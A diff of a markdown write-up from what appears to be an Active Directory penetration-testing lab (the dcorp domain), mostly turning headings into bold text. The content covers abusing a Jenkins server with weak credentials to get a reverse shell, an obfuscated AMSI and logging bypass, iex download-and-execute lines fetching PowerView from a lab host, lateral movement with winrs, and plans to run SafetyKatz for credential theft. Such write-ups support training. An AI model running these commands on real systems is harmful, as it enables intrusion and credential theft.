@@ -387,7 +387,6 @@ COMPUTERNAME=dcorp-adminsrv
 dcorp\studentx
 ```
 
-
 ## Abuse Jenkins Instance
 **We have a misconfigured Jenkins instance on dcorp-ci (http://172.16.3.11:8080)**
 **Manually trying the usernames as passwords we can identify that the user builduser has password builduser.**
@@ -554,7 +553,7 @@ dcorp-adminsrv  dcorp\websvc        True
 ![alt text](image-29.png)
 
 ### We got a reverse shell on dcorp-ci as ciadmin by abusing Jenkins.
-### We can use Powerview’s Find-DomainUserLocation on the reverse shell to looks for machines where a domain admin is logged in. First, we must bypass AMSI and enhanced logging
+**We can use Powerview’s Find-DomainUserLocation on the reverse shell to looks for machines where a domain admin is logged in. First, we must bypass AMSI and enhanced logging**
 
 * PS C:\Users\Administrator\.jenkins\workspace\Projectx> iex (iwr http://172.16.100.31/sbloggingbypass.txt -UseBasicParsing)
 
@@ -565,7 +564,7 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) (
 
 ![alt text](image-30.png)
 
-### Now, download and execute PowerView in memory of the reverse shell and run Find-DomainUserLocation. Check all the machines in the domain
+**Now, download and execute PowerView in memory of the reverse shell and run Find-DomainUserLocation. Check all the machines in the domain**
 
 * iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
 * Find-DomainUserLocation
@@ -574,7 +573,7 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) (
 
 **There is a domain admin session on dcorp-mgmt server**
 
-### Let’s check if we can execute commands on dcorp-mgmt server and if the winrm port is open
+**Let’s check if we can execute commands on dcorp-mgmt server and if the winrm port is open**
 
 * PS C:\Users\Administrator\.jenkins\workspace\Projectx> winrs -r:dcorp-mgmt cmd /c "set computername && set username"
 ```
@@ -582,4 +581,4 @@ COMPUTERNAME=DCORP-MGMT
 USERNAME=ciadmin`
 ```
 
-### We would now run SafetyKatz.exe on dcorp-mgmt to extract credentials from it. For that, we need to  copy Loader.exe on dcorp-mgmt. Let's download Loader.exe on dcorp-ci and copy it from there to dcorp-mgmt. This is to avoid any downloading activity on dcorp-mgmt
+**We would now run SafetyKatz.exe on dcorp-mgmt to extract credentials from it. For that, we need to  copy Loader.exe on dcorp-mgmt Let's download Loader.exe on dcorp-ci and copy it from there to dcorp-mgmt. This is to avoid any downloading activity on dcorp-mgmt**
